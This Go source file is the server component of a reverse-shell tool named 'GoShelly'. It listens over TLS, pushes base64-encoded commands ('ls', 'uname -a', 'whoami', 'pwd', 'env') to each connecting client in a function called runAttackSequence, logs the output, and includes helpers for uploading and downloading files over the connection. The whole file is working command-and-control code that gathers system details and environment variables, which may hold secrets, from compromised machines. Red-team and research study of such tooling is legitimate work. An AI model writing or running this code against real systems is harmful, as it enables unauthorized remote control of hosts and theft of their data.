package basic

import (
	"bufio"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"net"
	"net/mail"
	"os"
	"os/exec"
	"strings"
	"time"
)

func handleError(err error) {
	if err != nil {
		log.Fatal(err)
	}
}

//file upl/downl functions, if needed
func uploadFile(conn net.Conn, path string) {
	// open file to upload
	fi, err := os.Open(path)
	handleError(err)
	defer fi.Close()
	// upload
	_, err = io.Copy(conn, fi)
	handleError(err)
}

func downloadFile(conn net.Conn, path string) {
	// create new file to hold response
	fo, err := os.Create(path)
	handleError(err)
	defer fo.Close()

	handleError(err)
	defer conn.Close()

	_, err = io.Copy(fo, conn)
	handleError(err)
}

func validateMailAddress(address string) {
	_, err := mail.ParseAddress(address)
	if err != nil {
		servlog.Println("Invalid Email Address. Proceeding anyway.")
		return
	}
	servlog.Println("Email Verified. True.")
}

func sendEmail(conn net.Conn) {
	if !emailEN {
		return
	}
}

func sendSlackMessage(conn net.Conn) {
	if !slackEN {
		return
	}
}

func genCert() {

	servlog.Println("Generating SSL Certificate.")
	validateMailAddress(sslEmail)
	_, err := exec.Command("/bin/bash", "./scripts/certGen.sh", sslEmail).Output()

	if err != nil {
		servlog.Printf("Error generating SSL Certificate: %s\n", err)
		os.Exit(1)
	}
}

func readFile() []string {

	file, err := os.Open(instrfile)
	if err != nil {
		log.Panic("Failed to open file.")
		os.Exit(1)
	}
	scanner := bufio.NewScanner(file)
	scanner.Split(bufio.ScanLines)
	var text []string
	for scanner.Scan() {
		text = append(text, scanner.Text())
	}
	file.Close()
	return text
}

func handleClient(conn net.Conn) {

	file, err := os.OpenFile("./logs/"+conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()
	logger := log.New(file, "", log.LstdFlags)
	logger.Println("FILE BEGINS HERE.")
	logger.Println("Client connected: ", conn.RemoteAddr())
	runAttackSequence(conn, logger)
	disconnectClient(conn, logger, *file)
	sendEmail(conn)
	sendSlackMessage(conn)
}

func setReadDeadLine(conn net.Conn) {
	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetReadDeadline failed:", err)
	}
}

func setWriteDeadLine(conn net.Conn) {
	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
	if err != nil {
		log.Panic("SetWriteDeadline failed:", err)
	}
}

func runAttackSequence(conn net.Conn, logger *log.Logger) {
	buffer := make([]byte, 1024)
	for _, element := range cmdsToRun {
		element = strings.TrimSpace(element)
		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
		logger.Println("EXECUTE: " + element)
		setWriteDeadLine(conn)
		_, err := conn.Write([]byte(encodedStr))
		if err != nil {
			return
		}
		time.Sleep(time.Second * 2)
		setReadDeadLine(conn)
		_, err = conn.Read(buffer)
		if err != nil {
			return
		}
		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
		logger.Println("RES: " + string(decodedStr[:]))
	}
}

func disconnectClient(conn net.Conn, logger *log.Logger, file os.File) {
	logger.Println("Disconnecting Client: ", strings.Split(conn.RemoteAddr().String(), ":")[0])
	logger.Println("\nDONE.\nFILE ENDS HERE.")
	file.Close()
	conn.Close()
}

var slackEN bool
var emailEN bool

var servlog *log.Logger

var cmdsToRun = []string{"ls", "uname -a", "whoami", "pwd", "env"}
var instrfile string
var l net.Listener

var sslEmail string
var PORT string

func StartServer(port string, EMAIL string) {

	//initialize global variables here
	sslEmail = EMAIL
	PORT = port
	//

	os.Mkdir("./logs/", os.ModePerm)
	servfile, err := os.OpenFile("./logs/"+"GoShellyServerLogs"+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		fmt.Println("Server log open error: ", err)
		os.Exit(1)
	}
	defer servfile.Close()
	servlog = log.New(servfile, "", log.LstdFlags)
	servlog.Println("Starting GoShelly server...")

	genCert() //to generate SSL certificate

	servlog.Println("Loading SSL Certificates")
	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")

	if err != nil {
		servlog.Printf("Error Loading Certificate: %s", err)
		os.Exit(1)
	}
	config := tls.Config{Certificates: []tls.Certificate{cert}}
	config.Rand = rand.Reader
	service := "0.0.0.0:" + PORT

	l, err = tls.Listen("tcp", service, &config)
	if err != nil {
		servlog.Printf("Server Listen error: %s", err)
	}
	servlog.Println("Server Listening on port: ", PORT)

	for {
		conn, err := l.Accept()

		if err != nil {
			servlog.Printf("%s Client accept error: %s", conn.RemoteAddr(), err)
			continue
		}
		servlog.Printf("Client accepted: %s", conn.RemoteAddr())
		tlscon, ok := conn.(*tls.Conn)
		if ok {
			log.Print("ok=true")
			state := tlscon.ConnectionState()
			for _, v := range state.PeerCertificates {
				log.Print(x509.MarshalPKIXPublicKey(v.PublicKey))
			}
		}
		servlog.Println("Handling Client: ", conn.RemoteAddr())
		go handleClient(conn)
	}
}
